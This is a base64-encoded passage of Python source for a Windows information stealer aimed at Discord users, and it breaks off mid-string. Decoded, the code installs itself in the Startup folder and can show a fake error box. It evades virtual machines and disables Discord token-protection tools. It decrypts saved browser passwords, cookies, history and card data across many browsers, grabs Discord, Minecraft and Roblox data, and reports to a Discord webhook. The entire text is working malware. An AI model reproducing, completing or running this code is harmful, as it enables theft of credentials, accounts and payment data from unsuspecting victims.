CAgICAgc2VsZi5kaXNjb3JkX3dlYmhvb2sgPSBzZWxmLmZldGNoX2NvbmYoJ3lvdXJ3ZWJob29rdXJsJykKCiAgICAgICAgc2VsZi5oaWRlID0gc2VsZi5mZXRjaF9jb25mKCJoaWRlIikKCiAgICAgICAgc2VsZi5waW5ndHlwZSA9IHNlbGYuZmV0Y2hfY29uZigicGluZ3R5cGUiKQoKICAgICAgICBzZWxmLnBpbmdvbnJ1biA9IHNlbGYuZmV0Y2hfY29uZigicGluZyIpCiAgICAgICAgCiAgICAgICAgc2VsZi5iYXNldXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIKCiAgICAgICAgc2VsZi5zdGFydHVwZXhlID0gc2VsZi5mZXRjaF9jb25mKCJzdGFydHVwIikKICAgICAgICAKICAgICAgICBzZWxmLmZha2VfZXJyb3IgPSBzZWxmLmZldGNoX2NvbmYoImZha2VfZXJyb3IiKQoKICAgICAgICBzZWxmLmFwcGRhdGEgPSBvcy5nZXRlbnYoImxvY2FsYXBwZGF0YSIpCgogICAgICAgIHNlbGYucm9hbWluZyA9IG9zLmdldGVudigiYXBwZGF0YSIpCiAgICAgICAgCiAgICAgICAgc2VsZi5jaHJtbXVzZXJkdHQgPSBudHBhdGguam9pbihzZWxmLmFwcGRhdGEsICdHb29nbGUnLCAnQ2hyb21lJywgJ1VzZXIgRGF0YScpCgogICAgICAgIHNlbGYuZGlyLCBzZWxmLnRlbXAgPSBta2R0ZW1wKCksIGdldHRlbXBkaXIoKQoKICAgICAgICBpbmYsIG5ldCA9IHNlbGYuc3lzXzFmbygpLCBzZWxmLm5ldF8xZm8oKQoKICAgICAgICBzZWxmLnV1aWR3bmR6LCBzZWxmLncxbnYzciwgc2VsZi53MW5rMzN5ID0gaW5mWzBdLCBpbmZbMV0sIGluZlsyXQoKICAgICAgICBzZWxmLmlwLCBzZWxmLmNpdHksIHNlbGYuY291bnRyeSwgc2VsZi5yZWdpb24sIHNlbGYub3JnLCBzZWxmLmxvYywgc2VsZi5nb29nbGVtYXAgPSBuZXRbMF0sIG5ldFsxXSwgbmV0WzJdLCBuZXRbM10sIG5ldFs0XSwgbmV0WzVdLCBuZXRbNl0KCiAgICAgICAgc2VsZi5zcnR1cGwwYyA9IG50cGF0aC5qb2luKHNlbGYucm9hbWluZywgJ01pY3Jvc29mdCcsICdXaW5kb3dzJywgJ1N0YXJ0IE1lbnUnLCAnUHJvZ3JhbXMnLCAnU3RhcnR1cCcpCgogICAgICAgIHNlbGYucmVnZXhfd2ViaG9va19kc2MgPSAiLnJ1L3JlbGF5IgoKICAgICAgICBzZWxmLmNocm1yZ3ggPSByZS5jb21waWxlKHInKF5wcm9maWxlXHNcZCopfGRlZmF1bHR8KGd1ZXN0IHByb2ZpbGUkKScsIHJlLklHTk9SRUNBU0UgfCByZS5NVUxUSUxJTkUpOwogICAgICAgIAogICAgICAgIHNlbGYuYmFzZXVybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUiCgogICAgICAgIHNlbGYucmVnZXggPSBjbGVhcl9yZWcKCiAgICAgICAgc2VsZi5lbmNyeXB0ZWRfcmVnZXggPSByImRRdzR3OVdnWGNROlteXCJdKiIKCiAgICAgICAgc2VsZi50b2tlbnMgPSBbXQoKICAgICAgICBzZWxmLmJjX2lkID0gW10KCiAgICAgICAgc2VsZi5zZXAgPSBvcy5zZXA7CgogICAgICAgIHNlbGYucm9ibG94Y29va2llcyA9IFtdOwoKICAgICAgICBzZWxmLmNocm9tZV9rZXkgPSBzZWxmLmd0bWszeShudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgIkxvY2FsIFN0YXRlIikpOwoKCiAgICAgICAgb3MubWFrZWRpcnMoc2VsZi5kaXIsIGV4aXN0X29rPVRydWUpOwoKCiAgICAKCgogICAgZGVmIGVycm9yX3JlbW90ZShzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBpZiBzZWxmLmZha2VfZXJyb3IgPT0gInllcyI6CiAgICAgICAgICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKE5vbmUsICdFcnJvciBjb2RlOiBXaW5kb3dzXzB4OTg4OTU4XG5Tb21ldGhpbmcgZ29uZSB3cm9uZy4nLCAnRmF0YWwgRXJyb3InLCAwKQoKICAgIGRlZiBwaW5nX29uX3J1bm5pbmcoc2VsZjogc3RyKSAtPiBzdHI6CiAgICAgICAgcGluZzEgPSB7CiAgICAgICAgICAgICdhdmF0YXJfdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZycsCiAgICAgICAgICAgICdjb250ZW50JzogIkBldmVyeW9uZSIKICAgICAgICAgICAgfQogICAgICAgIHBpbmcyID0gewogICAgICAgICAgICAnYXZhdGFyX3VybCc6ICdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLzIyODU0OTExMzU4MTUzNTIzNS80MzBmODFlYWQ2N2VhZmZjYWZmYmI2ZTdiMGFmMjkyNy5wbmcnLAogICAgICAgICAgICAnY29udGVudCc6ICJAaGVyZSIKICAgICAgICAgICAgfQogICAgICAgIGlmIHNlbGYucGluZ29ucnVuID09ICJ5ZXMiOgogICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rOgogICAgICAgICAgICAgICAgaWYgc2VsZi5waW5ndHlwZSA9PSAiQGV2ZXJ5b25lIiBvciBzZWxmLnBpbmd0eXBlID09ICJldmVyeW9uZSI6CiAgICAgICAgICAgICAgICAgICAgaHR0cHgucG9zdChzZWxmLmRpc2NvcmRfd2ViaG9vaywganNvbj1waW5nMSkKICAgICAgICAgICAgaWYgc2VsZi5waW5ndHlwZSA9PSAiQGhlcmUiIG9yIHNlbGYucGluZ3R5cGUgPT0gImhlcmUiOgogICAgICAgICAgICAgICAgaWYgc2VsZi5yZWdleF93ZWJob29rX2RzYyBpbiBzZWxmLmRpc2NvcmRfd2ViaG9vayA6CiAgICAgICAgICAgICAgICAgICAgaHR0cHgucG9zdChzZWxmLmRpc2NvcmRfd2ViaG9vaywganNvbj1waW5nMikKCgoKICAgIGRlZiBzdGFydHVwa2VrdyhzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBpZiBzZWxmLnN0YXJ0dXBleGUgPT0gInllcyI6CiAgICAgICAgICAgIHN0YXJ0dXBfcGF0aCA9IG9zLmdldGVudigiYXBwZGF0YSIpICsgIlxcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcIgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzdGFydHVwX3BhdGggKyBhcmd2WzBdKToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzdGFydHVwX3BhdGggKyBhcmd2WzBdKQogICAgICAgICAgICAgICAgY29weTIoYXJndlswXSwgc3RhcnR1cF9wYXRoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29weTIoYXJndlswXSwgc3RhcnR1cF9wYXRoKQoKCiAgICAgICAgICAgICAgICAKCgoKCiAgICBkZWYgYmNfZXhpdF90aGlzKHNlbGYpOgogICAgICAgIHNodXRpbC5ybXRyZWUoc2VsZi5kaXIsIGlnbm9yZV9lcnJvcnM9VHJ1ZSkKICAgICAgICBvcy5fZXhpdCgwKQoKICAgIGRlZiBleHRyYWN0X3RyeShmdW5jKToKICAgICAgICAnJydEZWNvcmF0b3IgdG8gc2FmZWx5IGNhdGNoIGFuZCBpZ25vcmUgZXhjZXB0aW9ucycnJwogICAgICAgIGRlZiB3cmFwcGVyKCphcmdzLCAqKmt3YXJncyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIHJldHVybiB3cmFwcGVyCgogICAgYXN5bmMgZGVmIGluaXQoc2VsZik6CiAgICAgICAgc2VsZi5icm93c2VycyA9IHsKICAgICAgICAgICAgJ2FtaWdvJzogc2VsZi5hcHBkYXRhICsgJ1xcQW1pZ29cXFVzZXIgRGF0YScsCiAgICAgICAgICAgICd0b3JjaCc6IHNlbGYuYXBwZGF0YSArICdcXFRvcmNoXFxVc2VyIERhdGEnLAogICAgICAgICAgICAna29tZXRhJzogc2VsZi5hcHBkYXRhICsgJ1xcS29tZXRhXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnb3JiaXR1bSc6IHNlbGYuYXBwZGF0YSArICdcXE9yYml0dW1cXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdjZW50LWJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJzdzdGFyJzogc2VsZi5hcHBkYXRhICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnc3B1dG5payc6IHNlbGYuYXBwZGF0YSArICdcXFNwdXRuaWtcXFNwdXRuaWtcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICd2aXZhbGRpJzogc2VsZi5hcHBkYXRhICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZ29vZ2xlLWNocm9tZSc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZXBpYy1wcml2YWN5LWJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ21pY3Jvc29mdC1lZGdlJzogc2VsZi5hcHBkYXRhICsgJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGEnLAogICAgICAgICAgICAndXJhbic6IHNlbGYuYXBwZGF0YSArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ3lhbmRleCc6IHNlbGYuYXBwZGF0YSArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2JyYXZlJzogc2VsZi5hcHBkYXRhICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2lyaWRpdW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxJcmlkaXVtXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZWRnZSc6IHNlbGYuYXBwZGF0YSArICJcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhIgoKICAgICAgICB9ICAgICAgICAKICAgICAgICBzZWxmLnByb2ZpbGVzID0gWwogICAgICAgICAgICAnRGVmYXVsdCcsCiAgICAgICAgICAgICdQcm9maWxlIDEnLAogICAgICAgICAgICAnUHJvZmlsZSAyJywKICAgICAgICAgICAgJ1Byb2ZpbGUgMycsCiAgICAgICAgICAgICdQcm9maWxlIDQnLAogICAgICAgICAgICAnUHJvZmlsZSA1JywKICAgICAgICBdCgogICAgICAgIGlmIHNlbGYuZGlzY29yZF93ZWJob29rID09ICIiIG9yIHNlbGYuZGlzY29yZF93ZWJob29rID09ICJceDU3RUJIT09LX0hFUkUiOgogICAgICAgICAgICBzZWxmLmJjX2V4aXRfdGhpcygpCiAgICAgICAgICAgIAogICAgICAgIHNlbGYuZXJyb3JfcmVtb3RlKCkKICAgICAgICBzZWxmLnN0YXJ0dXBrZWt3KCkKCiAgICAgICAgaWYgc2VsZi5mZXRjaF9jb25mKCdkYnVna2lsbGVyJykgYW5kIE5vRGVidWdnKCkuaW5WTSBpcyBUcnVlOgogICAgICAgICAgICBzZWxmLmJjX2V4aXRfdGhpcygpCiAgICAgICAgYXdhaXQgc2VsZi5ieXBhc3NfYnR0ZHNjKCkKICAgICAgICBhd2FpdCBzZWxmLmJ5cGFzc190b2tlbnBydGN0KCkKCiAgICAgICAgZnVuY3Rpb25fbGlzdCA9IFtzZWxmLnN0ZWFsX3NjcmVlbiwgc2VsZi5zeXN0ZW1faW5mb3JtYXRpb25zLCBzZWxmLnN0ZWFsX3Rva2VuLCBzZWxmLmdyYWJiX21jLCBzZWxmLmdyYWJiX3JvYmxveF0KCgogICAgICAgIGlmIHNlbGYuZmV0Y2hfY29uZigna2lsbF9kaXNjb3JkX3Byb2Nlc3MnKToKCiAgICAgICAgICAgIGF3YWl0IHNlbGYua2lsbF9wcm9jZXNzX2lkKCkKCgoKICAgICAgICBvcy5tYWtlZGlycyhudHBhdGguam9pbihzZWxmLmRpciwgJ0Jyb3dzZXJzJyksIGV4aXN0X29rPVRydWUpCiAgICAgICAgZm9yIG5hbWUsIHBhdGggaW4gc2VsZi5icm93c2Vycy5pdGVtcygpOgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2RpcihwYXRoKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICBzZWxmLm1hc3RlcmtleSA9IHNlbGYuZ3RtazN5KHBhdGggKyAnXFxMb2NhbCBTdGF0ZScpCiAgICAgICAgICAgIHNlbGYuZnVuY3MgPSBbCiAgICAgICAgICAgICAgICBzZWxmLnN0ZWFsX2Nvb2tpZXMyLAogICAgICAgICAgICAgICAgc2VsZi5zdGVhbF9oaXN0b3J5MiwKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfcGFzc3dvcmRzMiwKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfY2MyCiAgICAgICAgICAgIF0KCiAgICAgICAgICAgIGZvciBwcm9maWxlIGluIHNlbGYucHJvZmlsZXM6CiAgICAgICAgICAgICAgICBmb3IgZnVuYyBpbiBzZWxmLmZ1bmNzOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgZnVuYyhuYW1lLCBwYXRoLCBwcm9maWxlKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAKICAgICAgICBpZiBudHBhdGguZXhpc3RzKHNlbGYuY2hybW11c2VyZHR0KSBhbmQgc2VsZi5jaHJvbWVfa2V5IGlzIG5vdCBOb25lOgogICAgICAgICAgICBvcy5tYWtlZGlycyhudHBhdGguam9pbihzZWxmLmRpciwgJ0dvb2dsZScpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICBmdW5jdGlvbl9saXN0LmV4dGVuZChbc2VsZi5zdGVhbF9wYXNzd29yZHMsIHNlbGYuc3RlYWxfY29va2llcywgc2VsZi5zdGVhbF9oaXN0b3J5XSkKCiAgICAgICAgZm9yIGZ1bmMgaW4gZnVuY3Rpb25fbGlzdDoKICAgICAgICAgICAgcHJvY2VzcyA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWZ1bmMsIGRhZW1vbj1UcnVlKQogICAgICAgICAgICBwcm9jZXNzLnN0YXJ0KCkKICAgICAgICBmb3IgdCBpbiB0aHJlYWRpbmcuZW51bWVyYXRlKCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHQuam9pbigpCiAgICAgICAgICAgIGV4Y2VwdCBSdW50aW1lRXJyb3I6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIHNlbGYubmF0aWZ5X21hdGNoZWRfdG9rZW5zKCkKICAgICAgICBzZWxmLnBpbmdfb25fcnVubmluZygpCiAgICAgICAgc2VsZi5maW5pc2hlZF9iYygpCgogICAgCiAgICBhc3luYyBkZWYgYnlwYXNzX3Rva2VucHJ0Y3Qoc2VsZik6CiAgICAgICAgdHAgPSBmIntzZWxmLnJvYW1pbmd9XFxEaXNjb3JkVG9rZW5Qcm90ZWN0b3JcXCIKICAgICAgICBpZiBub3QgbnRwYXRoLmV4aXN0cyh0cCk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGNvbmZpZyA9IHRwICsgImNvbmZpZy5qc29uIgoKICAgICAgICBmb3IgaSBpbiBbIkRpc2NvcmRUb2tlblByb3RlY3Rvci5leGUiLCAiUHJvdGVjdGlvblBheWxvYWQuZGxsIiwgInNlY3VyZS5kYXQiXToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgb3MucmVtb3ZlKHRwICsgaSkKICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIGlmIG50cGF0aC5leGlzdHMoY29uZmlnKToKICAgICAgICAgICAgd2l0aCBvcGVuKGNvbmZpZywgZXJyb3JzPSJpZ25vcmUiKSBhcyBmOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGl0ZW0gPSBqc29uLmxvYWQoZikKICAgICAgICAgICAgICAgIGV4Y2VwdCBqc29uLmRlY29kZXIuSlNPTkRlY29kZUVycm9yOgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgaXRlbVsna2Vrd19pc19oZXJlJ10gPSAiaHR0cHM6Ly9rZWt3bHRkLnJ1IgogICAgICAgICAgICAgICAgaXRlbVsnYXV0b19zdGFydCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2F1dG9fc3RhcnRfZGlzY29yZCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eSddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9hbGxvd2JldHRlcmRpc2NvcmQnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2tleGVjdXRhYmxlJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNraGFzaCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja21vZHVsZSddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja3NjcmlwdHMnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2tyZXNvdXJjZSddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9yZWRvd25sb2FkaGFzaGVzJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaXRlcmF0aW9uc19pdiddID0gMzY0CiAgICAgICAgICAgICAgICBpdGVtWydpdGVyYXRpb25zX2tleSddID0gNDU3CiAgICAgICAgICAgICAgICBpdGVtWyd2ZXJzaW9uJ10gPSA2OTQyMAogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnLCAndycpIGFzIGY6CiAgICAgICAgICAgICAgICBqc29uLmR1bXAoaXRlbSwgZiwgaW5kZW50PTIsIHNvcnRfa2V5cz1UcnVlKQogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKCJcblxuLy9LRUtXTFREIHwgaHR0cHM6Ly9rZWt3bHRkLnJ1IikKCiAgICBhc3luYyBkZWYga2lsbF9wcm9jZXNzX2lkKHNlbGYpOgogICAgICAgIGJsbGlzdCA9IHNlbGYuZmV0Y2hfY29uZignYmxwcmdnZycpCiAgICAgICAgZm9yIGkgaW4gWydkaXNjb3JkJywgJ2Rpc2NvcmR0b2tlbnByb3RlY3RvcicsICdkaXNjb3JkY2FuYXJ5JywgJ2Rpc2NvcmRkZXZlbG9wbWVudCcsICdkaXNjb3JkcHRiJ106CiAgICAgICAgICAgIGJsbGlzdC5hcHBlbmQoaSkKICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6CiAgICAgICAgICAgIGlmIGFueShwcm9jc3RyIGluIHByb2MubmFtZSgpLmxvd2VyKCkgZm9yIHByb2NzdHIgaW4gYmxsaXN0KToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBwcm9jLmtpbGwoKQogICAgICAgICAgICAgICAgZXhjZXB0IChwc3V0aWwuTm9TdWNoUHJvY2VzcywgcHN1dGlsLkFjY2Vzc0RlbmllZCk6CiAgICAgICAgICAgICAgICAgICAgcGFzcwoKCiAgICBhc3luYyBkZWYgYnlwYXNzX2J0dGRzYyhzZWxmKToKICAgICAgICBiZCA9IHNlbGYucm9hbWluZyArICJcXEJldHRlckRpc2NvcmRcXGRhdGFcXGJldHRlcmRpc2NvcmQuYXNhciIKICAgICAgICBpZiBudHBhdGguZXhpc3RzKGJkKToKICAgICAgICAgICAgeCA9IHNlbGYucmVnZXhfd2ViaG9va19kc2MKICAgICAgICAgICAgd2l0aCBvcGVuKGJkLCAncicsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykgYXMgZjoKICAgICAgICAgICAgICAgIHR4dCA9IGYucmVhZCgpCiAgICAgICAgICAgICAgICBjb250ZW50ID0gdHh0LnJlcGxhY2UoeCwgJ2tla3dsdGQnKQogICAgICAgICAgICB3aXRoIG9wZW4oYmQsICd3JywgbmV3bGluZT0nJywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShjb250ZW50KQoKICAgIEBleHRyYWN0X3RyeQogICAgZGVmIGRlY3J5cHRfdmFsKHNlbGYsIGJ1ZmYsIG1hc3Rlcl9rZXkpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuICJGYWlsZWQgdG8gZGVjcnlwdCBwYXNzd29yZCIKCiAgICBkZWYgZ2V0X21hc3Rlcl9rZXkoc2VsZiwgcGF0aCk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgYyA9IGYucmVhZCgpCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpCiAgICAgICAgbWFzdGVyX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICBtYXN0ZXJfa2V5ID0gbWFzdGVyX2tleVs1Ol0KICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICAgICAgcmV0dXJuIG1hc3Rlcl9rZXkKCiAgICBkZWYgc3RlYWxfdG9rZW4oc2VsZik6CiAgICAgICAgcGF0aHMgPSB7CiAgICAgICAgICAgICdEaXNjb3JkJzogc2VsZi5yb2FtaW5nICsgJ1xcZGlzY29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogc2VsZi5yb2FtaW5nICsgJ1xcZGlzY29yZGNhbmFyeVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0xpZ2h0Y29yZCc6IHNlbGYucm9hbWluZyArICdcXExpZ2h0Y29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Rpc2NvcmQgUFRCJzogc2VsZi5yb2FtaW5nICsgJ1xcZGlzY29yZHB0YlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ09wZXJhJzogc2VsZi5yb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ09wZXJhIEdYJzogc2VsZi5yb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0FtaWdvJzogc2VsZi5hcHBkYXRhICsgJ1xcQW1pZ29cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1RvcmNoJzogc2VsZi5hcHBkYXRhICsgJ1xcVG9yY2hcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0tvbWV0YSc6IHNlbGYuYXBwZGF0YSArICdcXEtvbWV0YVxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnT3JiaXR1bSc6IHNlbGYuYXBwZGF0YSArICdcXE9yYml0dW1cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0NlbnRCcm93c2VyJzogc2VsZi5hcHBkYXRhICsgJ1xcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJzdTdGFyJzogc2VsZi5hcHBkYXRhICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdTcHV0bmlrJzogc2VsZi5hcHBkYXRhICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnVml2YWxkaSc6IHNlbGYuYXBwZGF0YSArICdcXFZpdmFsZGlcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZSBTeFMnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZSBTeFNcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZSc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUxJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAxXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lMic6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgMlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZTMnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDNcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWU0Jzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lNSc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgNVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0VwaWMgUHJpdmFjeSBCcm93c2VyJzogc2VsZi5hcHBkYXRhICsgJ1xcRXBpYyBQcml2YWN5IEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ01pY3Jvc29mdCBFZGdlJzogc2VsZi5hcHBkYXRhICsgJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGFcXERlZmF1bFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1VyYW4nOiBzZWxmLmFwcGRhdGEgKyAnXFx1Q296TWVkaWFcXFVyYW5cXFVz